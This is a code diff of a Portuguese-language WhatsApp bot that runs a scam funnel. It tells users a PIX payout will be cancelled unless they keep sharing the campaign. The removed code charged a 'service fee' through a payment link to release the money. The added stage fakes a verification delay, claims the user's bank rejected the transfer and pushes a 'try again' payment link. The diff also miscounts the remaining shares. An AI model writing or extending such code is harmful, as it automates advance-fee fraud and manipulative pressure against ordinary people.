@@ -506,13 +506,16 @@ const processMessage = async (msg, client) => {
 
                 const shared_times = await db.getLead(user);
 
-                if (shared_times[0].share_count == 0) {
+                if (shared_times[0].share_count < config.share_numbers) {
                   await sendMsg(
                     {
                       type: "button",
-                      message: `${name}, a transferência de  R$${balance[0].Total} está prestes a ser cancelada... Isso, porque você não compartilhou nem uma vez nossa ação!!
-                    \n*MAS CALMA QUE AINDA DÁ TEMPO!*`,
-                      footer: `ÚLTIMA CHANCE! APROVEITE`,
+                      message: `${name}, a transferência de  R$${balance[0].Total} está prestes a ser cancelada... Isso, porque você não terminou de compartilhar está ação.!!
+                    
+                    \nFaltam apenas ${(shared_times[0].share_count - config.share_numbers)} compratilhamentos
+                    
+                      \n*CALMA QUE AINDA DÁ TEMPO!*`,
+                      footer: `NÃO PERCAR ESSA CHANCE! APROVEITE`,
                       from: msg.key.remoteJid,
                       config: {
                         buttons: [
@@ -541,26 +544,89 @@ const processMessage = async (msg, client) => {
           );
         }
       } else if (stage == "11") {
-        const balance = await db.getBalance(user);
-        await sendMsg(
-          {
-            type: "button",
-            message: `*⚠️ ATENÇÂO*: Essa transferência via PIX sera creditada na sua conta imediatamente após o pagamento da taxa de Serviços da ${config.empresaName}.`,
-            footer: `Pague para Liberar o PIX de R$${balance[0].Total}`,
-            from: msg.key.remoteJid,
-            config: {
-              buttons: [
-                {
-                  type: "link", //link , call, text
-                  text: "PAGAR PARA RECEBER",
-                  action: "https://mpago.la/2EeufDX",
-                },
-              ],
+       /* const balance = await db.getBalance(user);
+      */
+     //aguardando a transferencia
+
+     await sendMsg(
+      {
+        type: "text",
+        message: `Calma  ${name}, estamos fazendo a transferência.`,
+        from: msg.key.remoteJid,
+      },
+      client
+    );
+    
+       
+      } else if (stage == "12") {
+
+        if (msg.message.templateButtonReplyMessage != null) {
+          //INFORMAR O ERRO QUE OCORREU
+
+          if (buttonId == 1) {
+           // RECEBI
+           await sendMsg(
+            {
+              type: "text",
+              message: `Que bom que deu tudo certo, volte amanhã para responder mais perguntas.`,
+              from: msg.key.remoteJid,
             },
-          },
-          client
-        );
-      } else if (stage == "999") {
+            client
+          );
+
+          }
+          if (buttonId == 2) {
+            // ÑAO RECEBI
+
+            await sendMsg(
+              {
+                type: "text",
+                message: `Só um momento vou verificar aqui 🧐.`,
+                from: msg.key.remoteJid,
+              },
+              client
+            );
+
+            await delay(3000);
+
+            await sendMsg(
+              {
+                type: "button",
+                message: `${name}, parece que, realmente houve um problema, *seu banco rejeitou* nossa transferência via pix no valor de *R$${balance[0].Total}* 💸.`,
+                footer: `Não deixe sua trânsferencia ser cancelada!`,
+                from: msg.key.remoteJid,
+                config: {
+                  buttons: [
+                    {
+                      type: "link", //link , call, text
+                      text: "TENTAR NOVAMENTE",
+                      action: config.root + "/p/" + uuid,
+                    },
+                  ],
+                },
+              },
+              client
+            );
+
+            
+
+           }
+
+
+          
+
+         
+        } else {
+          //ERRO USUARIO RESPODEU EM TEXTO
+          await sendMsg(
+            {
+              type: "text",
+              message: `Por favor responda usando os botoes acima 👆`,
+              from: msg.key.remoteJid,
+            },
+            client
+          );
+        }
       } else if (stage == "999") {
       } else {
         // processa a requisição
